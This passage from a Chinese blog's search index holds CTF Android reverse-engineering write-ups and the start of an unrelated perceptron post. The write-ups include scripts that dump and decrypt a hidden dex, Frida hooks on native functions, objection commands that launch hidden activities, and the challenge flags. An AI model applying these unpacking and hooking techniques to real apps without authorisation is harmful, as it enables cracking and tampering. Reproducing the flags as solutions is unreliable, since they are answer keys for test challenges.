asset_img 14.5.png IDA分析 %}\n\n{% asset_img 14.6.png IDA分析 %}\n\n{% asset_img 14.7.png IDA分析 %}\n\n所以我们首先取出`unk_7004`里面的加密数据，再将它解密，再解压缩得出dex内容将它写入文件中。\n\nFile -> Script commond，选择Python，编写ida dump脚本将数据提取出来：\n\n```python\nfrom idaapi import *\naddr = 0x7004\nsize = 0x3CA10\nfile2Write = '.\\\\cipherdata'\nwith open(file2Write,'wb') as f:\n    f.write(get_bytes(addr,size))\n```\n\n在so文件的同目录下就会生成一个`cipherdata`文件。接下来给这个文件进行解密操作。\n\n```python\nimport zlib\nfile2Read = '.\\\\cipherdata'\nfile2Write = '.\\\\easydex.dex'\n\nwith open(file2Read, 'rb') as f2R:\n    data = list(f2R.read())\n    size = 0x3CA10\n    times = 0\n\n    while True:\n        #10次1组\n        if times <= 89:\n            timesDivide10 = int(times / 10)\n\n            #10字节1组\n            if times % 10 == 9:\n                sizesDivide10 = int(size / 10)\n                i = 0\n                for _ in range(sizesDivide10):\n                    data[sizesDivide10 * timesDivide10 + i] ^= times\n                    i += 1\n\n                #次数为89次时\n                if times == 89:\n                    j = (timesDivide10 + 1) * sizesDivide10\n                    while j < size:\n                        data[j] ^= 89\n                        j += 1\n                    break\n        times += 1\n\n#解压数据\ndata = zlib.decompress(bytes(data))\n\n#判断解压出的数据是否是dex格式\ntype = data[0:3].decode(\"utf8\")\nif type == 'dex':\n    #将数据写入文件\n    with open(file2Write, 'wb') as f2W:\n        f2W.write(data)\n```\n\n将dex文件载入jeb，就可以查看这个程序的`MainActivity`类了。\n\n{% asset_img 14.8.png jeb分析 %}\n\n{% asset_img 14.9.png jeb分析 %}\n\n{% asset_img 14.10.png jeb分析 %}\n\n{% asset_img 14.11.png jeb分析 %}\n\n{% asset_img 14.12.png jeb分析 %}\n\n那么，先找密钥。密钥的id号为`2131099683`，转换成十六进制为`0x7F060023`。将dex重命名为`classes.dex`放到解包目录下，重打包。解包目录下就会生成一个`bulid`目录。\n\n{% asset_img 14.13.png 资源文件 %}\n\n将`resources.arsc`载入jadx，查找id号。\n\n{% asset_img 14.14.png jadx分析 %}\n\n继续查找`two_fish`，找到一串字符串，这个就是密钥。\n\n{% asset_img 14.15.png jadx分析 %}\n\n```\nI have a male fish and a female fish.\n```\n\nTwofish是什么？它其实是一个分组加密算法！Twofish是布鲁斯·施奈尔带领的项目组于1998年研发的区块加密算法。美国国家标准技术研究所(NIST)公开招募的高级加密标准（AES）算法最终候选算法之一，但最终并未当选高级加密标准算法。双鱼算法的标志性特点是它采用了和密钥相关的替换盒（S盒）。密钥输入位的一半被用于“真正的”加密流程进行编排并作为Feistel的轮密钥使用，而另一半用于修改算法所使用的S盒。双鱼算法的密钥编排非常复杂。软件实现的128位双鱼算法在大多数平台上的运行速度不及最终获胜的128位的AES标准算法Rijndael，不过，256位的双鱼算法运行速度却较AES-256稍快。包括Twofish-ECB, Twofish-CBC, Twofish-CTR, Twofish-OFB, Twofish-CFB。\n\n所以再来捋一下思路。我们输入的字符串与密钥进行Twofish加密的结果是字节数组m。密钥经过&0xFF转换不需要我们手动操作，因为网上的解密算法已经包含在内了。但网上的加密算法得出来的不是带负数的字节数组，而是Base64或hex。所以我们可以先将字节数组转换成Base64的形式，再拿去解密。\n\n```python\nimport base64\nflag = [-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 31, 24, -91, -112, -83, 64, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 117, 29, -44, 6, 112, -4, 81, 84, 9, 22, -51, 95, -34, 12, 47, 77]\ndata = []\nfor i in flag:\n    data.append(i&0xFF)\nprint(base64.b64encode(bytes(data)))\n'''\nb'iE3y2hEF1izgbVUfGKWQrUCtgFQFop7iEkbmRwWdwsZ1HdQGcPxRVAkWzV/eDC9N'\n'''\n```\n\n{% asset_img 14.16.png twofish解密 %}\n\n```\nqwb{TH3y_Io<e_EACh_OTh3r_FOrEUER}\n```\n\n# 15. 你是谁\n\n{% asset_img 15.1.jpg 运行程序 %}\n\n载入AK，有so文件。载入jeb，找到`MainActivity`中的`onCreate`方法。\n\n{% asset_img 15.2.png jeb分析 %}\n\n{% asset_img 15.3.png jeb分析 %}\n\n{% asset_img 15.4.png jeb分析 %}\n\n{% asset_img 15.5.png jeb分析 %}\n\n```\n11 12 17 18 20 23 26 29 30 34 35 39 40 49 51 58 62 67 73 76 84 85\n```\n\n按照上面点位点好后，弹出`Right design`，点击按钮，弹出`通过爱的验证`。好像并没有什么用。再往上找找源码，发现有flag字样。\n\n{% asset_img 15.6.png jeb分析 %}\n\n中文意思是“你获得了已经排序过的flag”。\n\n```python\nprint(chr(20667))\nprint(chr(25105))\nprint(chr(26159))\nprint(chr(36924))\n'''\n傻\n我\n是\n逼\n'''\n```\n\n结合题目和代码，这个重新排序应该是“我是傻逼”。而它说了，那个是排序过的flag，而正确的flag应该为`25105 26159 20667 36924`。\n\n```\nflag{25105 26159 20667 36924}\n```\n\n# 16. Android2.0\n\n{% asset_img 16.1.png 运行程序 %}\n\n载入AK发现有so文件，载入jeb分析源码。\n\n{% asset_img 16.2.png jeb分析 %}\n\n{% asset_img 16.3.png jeb分析 %}\n\n解包，将so文件载入IDA，分析`getResult`方法。\n\n{% asset_img 16.4.png IDA分析 %}\n\n{% asset_img 16.5.png IDA分析 %}\n\n尝试编写Python脚本：\n\n```python\nv5 = \"LN^dl\"\nv5arr = list(v5)\nv6 = [0x20, 53, 45, 0x16, 97]\nv7 = list(\"AFBo}\")\nans = \"\"\nfor i in range(4):\n    ans += chr((ord(v5arr[i]) ^ 0x80) // 2)\nans += 'l'\nfor i in range(4):\n    ans += chr(ord(v5arr[i]) ^ v6[i])\nans += 'a'\nfor i in range(4):\n    ans += chr(ord(v7[i]) ^ v6[i])\nans += '}'\nprint(ans)\n'''\nfgorll{sraasoy}\n'''\n```\n\n提交flag发现不对，看看哪里漏了。最后发现`Init`函数不是简单的平均分成3组，而是对正确的flag的每个索引除以3取余得到`fgorll{sraasoy}`。\n\n```python\nans = \"fgorll{sraasoy}\"\nansarr = list(ans)\nans = \"\"\nfor i in range(5):\n    ans += ansarr[i] + ansarr[i+5] + ansarr[i+10]\nprint(ans)\n'''\nflag{sosorryla}\n'''        \n```\n\n# 17. boomshakalaka-3\n\n啊好讨厌为什么它是游戏！！我已经玩了好几分钟了！\n\n{% asset_img 17.1.png 运行程序 %}\n\n载入AK看到它有so文件，载入jeb分析源码：\n\n{% asset_img 17.2.png jeb分析 %}\n\n这个base64解码得`bazingaaaa`。诶结果不是这个。进去a类看看吧。\n\n{% asset_img 17.3.png jeb分析 %}\n\nSharedPreferences是一个轻量级的存储类，特别适合用于保存软件配置参数。使用SharedPreferences保存数据，其背后是用xml文件存放数据，文件存放在/data/data/程序包名/shared_prefs目录下。\n\n```java\npublic abstract SharedPreferences getSharedPreferences(String name, int mode);\n```\n\n第一个参数是存储时的名称，第二个参数则是文件的打开方式。\n\n那我们先找找它的xml文件吧。这个程序的包名为`com.example.plane`，包名可在`AndroidManifest.xml`的`manifest`标签中找到。\n\n{% asset_img 17.4.png 程序包名 %}\n\n{% asset_img 17.5.png xml文件 %}\n\n{% asset_img 17.6.png xml文件 %}\n\n所以可以推测`N0`和`MG`被写进了`Cocos2dxPrefsFile.xml`文件中。\n\n{% asset_img 17.7.png jeb分析 %}\n\n但打开`Cocos2dxPrefsFile.xml`文件却发现不止这两个字符串。我刚才玩了两次，出现了两个极为相似的字符串。\n\n{% asset_img 17.8.png xml文件 %}\n\n那就再玩几次试试。我发现每次关闭程序再打开又重新写入`MGN0`，而不关闭程序重新玩不会写入`MGN0`，每次结束都会以`dz99`为结束标志。\\*\\*里面的是每个串的区别。\n\n```\nMGN0ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99\n    ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRzRV*dz99\n\nMGN0ZntDMGNvUzJkX0FuRHJvMW*RfRz*dz99\n    ZntDMGNvUzJkX0FuRHJvMWdz99\n    ZntDMGNvUzJkX0FuRHJvMW*Rf*dz99\n```\n\n这些星号里面的串有些区别，但又是固定出现的，比如都是`Rf`、`RV`等等。说明在某个内存中存有这些字符。解包将so文件载入IDA，在函数名窗口搜索`score`，发现有好多这些字符串。\n\n{% asset_img 17.9.png IDA分析 %}\n\n原来`MW`其实也是包含在里面的。将这些字符串组合起来`MWRfRzBtRV9Zb1VfS24w`，再将前缀和后缀加上`MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99`。用Base64解码得`0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}`。为什么用Base64，其实题目上面的flag.xml中的Base64字符串已经暗示得很清楚了。\n\n```\n0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}\n```\n\n# 18. Illusion\n\n运行程序。\n\n{% asset_img 18.1.png 运行程序 %}\n\n载入AK，有一个Flag文件，打开出现一串字符串`Ku@'G_V9v(yGS`。\n\n{% asset_img 18.2.png AK中看到Flag文件 %}\n\n载入jeb，分析源码。\n\n{% asset_img 18.3.png jeb分析 %}\n\n将so文件载入IDA查看`CheckFlag`方法。\n\n{% asset_img 18.4.png IDA分析 %}\n\n如果要将算法逆过来，就需要将Flag里的字符串减32再左移32位。\n\n```python\nflag = list(\"Ku@'G_V9v(yGS\")\nfor i in range(len(flag)):\n    flag[i] = (ord(flag[i]) - 32) << 32\nprint(flag)\n'''\n[184683593728, 365072220160, 137438953472, 30064771072, 167503724544, 270582939648, 231928233984, 107374182400, 369367187456, 34359738368, 382252089344, 167503724544, 219043332096]\n'''\n```\n\n所以`sub_10C0`每次循环得出的值就是上面这一串数字。进去`sub_10C0`看看算法。\n\n{% asset_img 18.5.png IDA分析 %}\n\n{% asset_img 18.6.png IDA分析 %}\n\n(说着随机选取，结果还是认真算了)Flag字符串长度为13，所以在`aE116c5c66e7b37`数组中只取前13个字符。\n\n```\n.rodata:000023C8                 ; ORG 0x23C8\n.rodata:000023C8 aE116c5c66e7b37 DCB \"e116c5c66e7b373d912cb9b885b48913\",0\n```\n\n前13个字符为`e116c5c66e7b3`，其中最大的ASCII码为`e`(101)，最小是`1`(49)。而我们可以输入的可视化字符的ASCII码范围是32\\~126。所以`v9[i]+aE116c5c66e7b37[i]-64`的范围应该在17\\~163。照着IDA的代码抄一遍：\n\n```python\nfor a1 in range(17,164):\n    a2 = 93\n    v2 = a1 ^ a2\n    v3 = 1\n    v4 = 0\n    if((a2 & 0x80000000) != 0):\n        a2 = -a2\n    if((a1 & 0x80000000) != 0):\n        a1 = -a1\n    if(a1 >= a2):\n        while a2<0x10000000 and a2<a1:\n            a2 *= 16\n            v3 *= 16\n        while a2<0x80000000 and a2<a1:\n            a2 *= 2\n            v3 *= 2\n        while True:\n            if(a1 >= a2):\n                a1 -= a2\n                v4 |= v3\n            if(a1 >= a2 >> 1):\n                a1 -= a2 >> 1\n                v4 |= v3 >> 1\n            if(a1 >= a2 >> 2):\n                a1 -= a2 >> 2\n                v4 |= v3 >> 2\n            if(a1 >= a2 >> 3):\n                a1 -= a2 >> 3\n                v4 |= v3 >> 3\n            if a1 == 0:\n                break\n            v3 >>= 4\n            if v3 == 0:\n                break\n            a2 >>= 4\n    if v2 < 0:\n        v4 = -v4\n    print(v4, end = \" \")\n'''\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .\n'''\n```\n\n在这个范围完全没有这么大的数值...而且在这个范围要不就返回0要不就返回1。肯定是哪里出问题了。呜呜我看了牛牛们的wp说这个是假的，真的`CheckFlag`在`JNI_Onload`函数里，我就知道！！我就说导出表都有`CheckFlag`了怎么还有个`JNI_Onload`！以后记住从`JNI_Onload`进去准没错，还是没能抵挡住`CheckFlag`的诱惑。\n\n{% asset_img 18.9.png IDA分析 %}\n\n{% asset_img 18.10.png IDA分析 %}\n\n{% asset_img 18.11.png IDA分析 %}\n\n可以继续试试参数范围。`aLjavaLangStrin_0`存的字符串为`(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;`。取前13个字符为`(Ljava/lang/S`。最小的ASCII码为`40`(`(`)，最大的ASCII码为`118`(v)。所以`v10[i]+aLjavaLangStrin_0[i]-64`的范围在8~180。\n\n```python\n'''\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 Press any key to continue . . .\n'''\n```\n\n还是要不就是0要不就是1。这个时候就不要想是不是你的问题了！肯定是IDA反汇编的错！所以接下来要看汇编代码找到正确的逻辑。\n\n{% asset_img 18.7.png IDA分析 %}\n\n对于栈的立即数，可以右键 -> Q算得栈的偏移值。\n\n{% asset_img 18.8.jpg IDA分析 %}\n\n{% asset_img 18.12.png IDA分析 %}\n\n{% asset_img 18.13.png IDA分析 %}\n\n{% asset_img 18.14.png IDA分析 %}\n\n{% asset_img 18.15.png IDA分析 %}\n\n{% asset_img 18.16.png IDA分析 %}\n\n到这已经将所有细节都分析了，除了`sub_1028`，如果它反编译没错的话那答案基本就已经出来了。\n\n```\nflag = ((输入的字符串+内存字符串-64) - sub_1028(输入的字符串+内存字符串-64, 93) * 93) + 32\n```\n\n编写脚本：\n\n```python\nimport string\nflag = list(\"Ku@'G_V9v(yGS\")\nstr = list(\"(Ljava/lang/S\")\nans = \"\"\n#输出可打印字符串\ninput = string.printable\n\ndef sub_1028(a1):\n    a2 = 93\n    v2 = a1 ^ a2\n    v3 = 1\n    v4 = 0\n    if((a2 & 0x80000000) != 0):\n        a2 = -a2\n    if((a1 & 0x80000000) != 0):\n        a1 = -a1\n    if(a1 >= a2):\n        while a2<0x10000000 and a2<a1:\n            a2 *= 16\n            v3 *= 16\n        while a2<0x80000000 and a2<a1:\n            a2 *= 2\n            v3 *= 2\n        while True:\n            if(a1 >= a2):\n                a1 -= a2\n                v4 |= v3\n            if(a1 >= a2 >> 1):\n                a1 -= a2 >> 1\n                v4 |= v3 >> 1\n            if(a1 >= a2 >> 2):\n                a1 -= a2 >> 2\n                v4 |= v3 >> 2\n            if(a1 >= a2 >> 3):\n                a1 -= a2 >> 3\n                v4 |= v3 >> 3\n            if a1 == 0:\n                break\n            v3 >>= 4\n            if v3 == 0:\n                break\n            a2 >>= 4\n    if v2 < 0:\n        return -v4\n    return v4\n\nfor i in range(len(flag)):\n    for j in input:\n        data = ord(j) + ord(str[i]) - 64\n        v4 = sub_1028(data)\n        if (data - v4 * 93) + 32 == ord(flag[i]):\n            ans += j\nprint(ans)\n'''\nCISCN{GJ5728}\n'''\n```\n\n# 19. APK逆向-2\n\n在模拟器上安装失败，解包不能解包，用AK不能反编译。那就把它后缀改为`.zip`，解压发现可以解压。没有找到smali目录，但有`classes.dex`和`resources.arsc`文件。这两个文件在jadx都可以打开，但`AndroidManifest.xml`文件显示乱码。\n\n{% asset_img 19.1.png xml文件 %}\n\n其实我们解压时就可以知道是`AndroidManifest.xml`的问题了。\n\n{% asset_img 19.2.png xml文件 %}\n\n那么接下来就是要仔细分析`AndroidManifest.xml`文件。\n\n---------------------------\n\n{% asset_img 19.3.png xml文件结构图 %}\n\n`AndroidManifest.xml`文件采用小端模式存储，可以大体分为四个部分：\n\n1. Header：头文件\n\n\n2. String Chunk：存储字符串资源的程序块\n\n3. ResourceId Chunk：存储资源id的程序块\n\n4. XmlContent Chunk：存储xml内容程序块，其中包含了五个部分，Start Namespace Chunk 、End Namespace Chunk 、Start Tag Chunk 、End Tag Chunk 、Text Chunk\n\n**Header**\n\nmagicnumber：魔数，固定值 0x0008003(16进制)，占四个字节。\n\nfilesize：xml文件总字节数 ，占四个字节。\n\n**String Chunk**\n\nChunkType：StringChunk类型，4个字节 ，固定值 0x001c0001\n\nChunkSize：StringChunk大小 ，4个字节\n\nStringCount：StringChunk字符串的个数，4个字节\n\nStyleCount：StringChunk样式的个数，4个字节，固定值 0x00000000\n\nUnkown： 位置区域，4个字节，固定值 0x00000000解析时候需要略过4个字节\n\nStringPoolOffset：字符串池偏移量，4个字节，偏移量相对StringChunk头部位置\n\nStylePoolOffset：样式池偏移量，4个字节，偏移量相对于StringChunk头部位置，固定值 0x00000000 ，这个字段基本没用到过\n\nStringOffsets：每个字符串在字符串池中的相对偏移量，int数组，它的大小是 StringCount*4 个字节\n\nStyleOffsets：每个样式的偏移量，int数组，它的大小是 StyleCount*4 个字节\n\nString Pool：字符串池，存储了所有的字符串\n\nStyle Pool：样式池，存储了所有的样式，一般为0\n\n**ResourceId Chunk**\n\nChunkType：ResourceldChunk的类型，占4个字节，固定值 0x00080180\n\nChunkSize：ResourceldChunk的大小，占4个字节\n\nResourceIds：int数组，大小为(ChunkSize - 8) / 4 ，减 8是减去头部大小的8个字节(ChunkType和ChunkSize)\n\n**XmlContent Chunk**\n\nXmlContentChunk 这部分表示的是存储了清单文件的详细信息，包含的5项，其中Start Namespace Chunk 和End Namespace Chunk 这两个可以合并一个来说明， 因为它们的结构完全一致，解析过程也是一样的。至于End Tag Chunk一共有6个数据，也就是 Start Tag Chunk 的前 6 项，这里不做单独解析和说明。End Tag Chunk这个跟清单文件标签一样的，就是给解析出来的标签加上结束标签一样。Text Chunk这个模块在010 Editor模板里并没有用到过。\n\n\n\n*Start Namespace Chunk*主要包含一个清单文件的命令空间内容\n\nChunkType：Chunk的类型，4个字节 ，固定值 0x00100100\n\nChunkSize：Chunk的大小 ，4个字节\n\nLineNumber：清单文件中的行号， 4个字节\n\nUnknown：未知区域， 4个字节\n\nPrefix：命名空间的前缀， 4个字节\n\nUri：命名空间的URI， 4个字节\n\n\n\n*Start Tag Chunk*主要存放清单文件中的标签信息\n\nChunkType：Chunk的类型，4个字节 ，固定值 0x00100102\n\nChunkSize：Chunk的大小 ，4个字节\n\nLineNumber：清单文件中的行号， 4个字节\n\nUnknown：未知区域， 4个字节\n\nNamespace Uri：命名空间用到的url在字符串的索引，值为 -1 表示没有用到命名空间 uri。标签的一般都没有使用到命名空间，4个字节\n\nName：标签名称(在字符串中的索引值)，4个字节\n\nFlags：标签类型例如开始标签还是结束标签，固定值0x00140014，4个字节\n\nAttribute Count ：标签包含的属性个数，4个字节\n\nClass Attribute ：标签包含的类属性，此项值常为 0，4个字节\n\nAttributes ：属性内容集合,每个属性固定 20 个字节，包含 5 个字段，每个字段都是 4 字节无符号 int，解析的时候需要注意Type这个值做一次处理需要右移24位。各个字段含义如下：\n\n- NamespaceUri：属性的命名空间uri 在字符串池中的索引\n\n\n- Name：属性名称在字符串池中的索引\n\n\n- ValueStr：属性值\n\n\n- Type：属性类型\n\n\n- Data：属性数据\n\n----------------\n\n首先查看xml的固定值是否有误。ChunkType应该为01 00 1c 00。而且StylePoolOffset应该为00 00 00 00。修改完后一定要点保存，而不是另存为，因为我发现另存为后有些其它值也被修改了，导致重打包后再解包时出现错误！\n\n{% asset_img 19.4.png xml文件 %}\n\n{% asset_img 19.9.png xml文件 %}\n\n忽然发现解包时异常已经告诉我有其中一个错误了...\n\n{% asset_img 19.5.png apk解包 %}\n\n将它重打包时出现没有`apktool.yml`文件错误，将其它apk里面的`apktool.yml`复制一份下来，将apk文件名改了即可。\n\n{% asset_img 19.7.png apktool.yml %}\n\n{% asset_img 19.6.png apktool.yml %}\n\n这次终于成功解包了。\n\n{% asset_img 19.8.png 解包成功 %}\n\n所以xml有什么什么神秘的呢？发现中间那个字符串就是flag。\n\n{% asset_img 19.10.png xml文件 %}\n\n```\n8d6efd232c63b7d2\n```\n\n# 20. ill-intentions\n\n{% asset_img 20.1.png 运行程序 %}\n\n翻译一下就是，选择您希望与之交互的MainActivity，待办事项：添加按钮来选择活动，现在使用的是Send_to_Activity。\n\n载入AK看可不可以直接修改`AndroidManifest.xml`的入口，不行。程序还是那个界面。\n\n{% asset_img 20.2.png 修改文件 %}\n\n那就载入jeb分析看看吧。\n\n{% asset_img 20.3.png jeb分析 %}\n\n{% asset_img 20.4.png jeb分析 %}\n\n{% asset_img 20.5.png jeb分析 %}\n\n{% asset_img 20.6.png jeb分析 %}\n\n{% asset_img 20.7.png jeb分析 %}\n\n这些方法都是在so文件里面。解包先看看so文件。导出表刚好有这三个函数。如果导出表有native函数，说明这些是导出函数；如果没有，而只有JNI_Onload，说明那些是未导出函数。\n\n{% asset_img 20.8.png IDA分析 %}\n\n{% asset_img 20.9.png IDA分析 %}\n\n{% asset_img 20.10.png IDA分析 %}\n\n{% asset_img 20.11.png IDA分析 %}\n\n可以确定`DefinitelyNotThisOne`函数肯定没有flag。剩下那两个函数看得我头大，而且传入的参数也有些是在Java层加密过的。\n\n因为你！我去学了Frida so hook！[Frida超详细安装实战教程](https://www.52pojie.cn/thread-1128884-1-1.html)\n\nhook一个so方法需要知道：\n\n- 程序的名字(Frida-ps -U查看程序名字)：CTF Application\n- so文件名：libhello-jni.so\n- so方法名：Java_com_example_application_ThisIsTheRealOne_orThat\n\n编写hook脚本：\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nfunction main(){\nfunction getjstring(jstr) {\n        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();\n    }\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libhello-jni.so\",\"Java_com_example_application_ThisIsTheRealOne_orThat\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n        },\n        onLeave: function(retval){\n            send(\"orThat_result:\" + getjstring(retval));\n        }\n    });\n});\n}\nsetImmediate(main);\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('CTF Application')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n开启Frida服务：\n\n```\nC:\\Users\\dell>adb shell\naosp:/ # cd /data/local/tmp\naosp:/data/local/tmp # ls\nandroid_x86_server  frida-server-15.1.17-android-x86\naosp:/data/local/tmp # ./frida-server-15.1.17-android-x86\n```\n\n打开另一命令窗口开启端口转发，Frida默认端口27042：\n\n```\nC:\\Users\\dell>adb forward tcp:27042 tcp:27042\n27042\n```\n\n等等，突然想起来我们还没去到我们想要进去的Activity，修改xml文件我是不会修改了，但可以利用objection运行指定的Activity。\n\n安装objection：`pip install objection`\n\n在模拟器运行程序，在终端输入需要调试的程序的包名：`objection -g com.example.hellojni explore`\n\n```\nC:\\Users\\dell>objection -g com.example.hellojni explore\nUsing USB device `Android Emulator 5554`\nAgent injected and responds ok!\n\n     _   _         _   _\n ___| |_|_|___ ___| |_|_|___ ___\n| . | . | | -_|  _|  _| | . |   |\n|___|___| |___|___|_| |_|___|_|_|\n      |___|(object)inject(ion) v1.11.0\n\n     Runtime Mobile Exploration\n        by: @leonjza from @sensepost\n\n[tab] for command suggestions\ncom.example.hellojni on (Meizu: 7.1.2) [usb] #\n```\n\n列出app所有的Activity：`android hooking list activities`\n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android hooking list activities\ncom.example.application.DefinitelyNotThisOne\ncom.example.application.IsThisTheRealOne\ncom.example.application.MainActivity\ncom.example.application.ThisIsTheRealOne\n\nFound 4 classes\n```\n\n启动指定Activity：`android intent launch_activity com.example.application.ThisIsTheRealOne` \n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.ThisIsTheRealOne\n(agent) Starting activity com.example.application.ThisIsTheRealOne...\n(agent) Activity successfully asked to start.\n```\n\n可以看到程序页面已经变了：\n\n{% asset_img 20.12.png ThisIsTheRealOne页面 %}\n\n运行脚本，点击程序中间的按钮，打印返回值。\n\n```\nC:\\Users\\dell\\Desktop>python hookso.py\nHook start\norThat_result:KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints!\n```\n\n它说这个不是我要找的Activity，换一个。\n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.IsThisTheRealOne\n(agent) Starting activity com.example.application.IsThisTheRealOne...\n(agent) Activity successfully asked to start.\n```\n\n修改脚本：\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nfunction main(){\nfunction getjstring(jstr) {\n        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();\n    }\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libhello-jni.so\",\"Java_com_example_application_IsThisTheRealOne_perhapsThis\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n        },\n        onLeave: function(retval){\n            send(\"perhapsThis_result:\" + getjstring(retval));\n        }\n    });\n});\n}\nsetImmediate(main);\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('CTF Application')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n运行，点击按钮，打印返回值。\n\n```\nC:\\Users\\dell\\Desktop>python hookso.py\nHook start\nperhapsThis_result:Congratulation!YouFoundTheRightActivityHereYouGo-CTF{IDontHaveABadjokeSorry}\n```\n\n```\nCTF{IDontHaveABadjokeSorry}\n```\n\n# 21. LoopCrypto\n\n{% asset_img 21.1.png 运行程序 %}","categories":["Android逆向"],"tags":["CTF","Reverse"]},{"title":"感知机学习算法","url":"/posts/2670ba0d.html","content":"\n机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。\n\n<!--more-->\n\n```python\n#感知机原始形式算法\ndef ganzhiji(lst,n,w,b):\n    result = [-1]\n    while(''.join(str(result)).count('-')!=0):\n        result.clear()\n        for x in lst:\n            sum = x[2] * (w[0]*x[0] + w[1]*x[1] + b)\n            result.append(sum)\n            if sum > 0:\n                print(\"对({0},{1})T\".format(x[0],x[1]))\n                print(\"y(wx + b) = {0}({1}*{2} + {3}*{4} + {5}) > 0\".format(x[2],w[0],x[0],w[1],x[1],b), end=\"，\")\n                print(\"({0},{1})T被正确分类\".format(x[0], x[1]))\n                print()\n            else:\n                print(\"对({0},{1})T\".format(x[0],x[1]))\n                print(\"y(wx + b) = {0}({1}*{2} + {3}*{4} + {5}) <= 0\".format(x[2],w[0],x[0],w[1],x[1],b), end=\"，\")\n                print(\"({0},{1})T未被正确分类，更新w和b\".format(x[0], x[1]))\n                w[0] = w[0] + n*x[2]*(x[0])\n                w[1] = w[1] + n*x[2]*(x[1])\n                b = b + n*x[2]\n                print(\"w = ({0},{1})T, b = {2}\".format(w[0],w[1],b))\n                print(\"得到线性模型：{0}x(1) + {1}x(2) + {2}\".format(w[0],w[1],b))\n                print()\n\nif __name__ == '__main__':\n    #lst = [[4,3,1],[4,4,1],[3,1,-1]]\n    #n = 1\n    w = [0,0]\n    b = 0\n    \n    print(\"该算法默认权值w和偏置b都从0开始\")\n    lst = []\n    while(True):\n        z = input(\"输入数据集，比如(x,y)=[3,1,-1]输入3 1 -1(回车)，输入end结束：\")\n        x_list = z.split(' ')\n        if ''.join(x_list) == \"end\":\n            break\n        for i in range(len(x_list)):\n            x_list[i] = int(x_list[i])\n        lst.append(x_list)\n    n = int(input(\"算法的学习率为(0<n<=1)：\"))\n    ganzhiji(lst,n,w,b)\n```\n\n上面这个是为了与手写作业保持一致，看了老师给的参考代码后发现完全不是一个样子。下面贴上参考答案以及我对代码的理解。\n\n```python\n#利用Python实现感知机算法的原始形式\n# -*- encoding:utf-8 -*-\n \n \nimport numpy as np\nimport matplotlib.pyplot as plt\n \n#1、创建数据集\ndef createdata():\n    #np.array()的作用就是把列表转化为数组，也可以说是用来产生数组\n samples=np.array([[3,-3],[4,-3],[1,1],[1,2]])  \n labels=[-1,-1,1,1]\n return samples,labels  #返回值如果是两个及以上，是以元组的形式返回\n \n#训练感知机模型\nclass Perceptron:\n def __init__(self,x,y,a=1):\n  self.x=x\n  self.y=y\n  #x.shape()=samples.shape()用来输出数组的基本信息，print(x.shape())得(4,2),表示samples中有1个4行2列的二维数组，x.shape[1]=2\n  #np.zeros()返回一个给定形状和类型的用0填充的数组,此处表示返回一个2行1列的值全为0的数组\n  self.w=np.zeros((x.shape[1],1))#初始化权重，数学化表示为(0,0)^T\n  self.b=0#初始化偏置为0\n  self.a=1#学习率\n  self.numsamples=self.x.shape[0]#样本数为4\n  self.numfeatures=self.x.shape[1]#特征值为2\n \n def sign(self,w,b,x):\n     #np.dot()在这里用作向量内积\n  y=np.dot(x,w)+b\n  return int(y)\n \n def update(self,label_i,data_i):\n  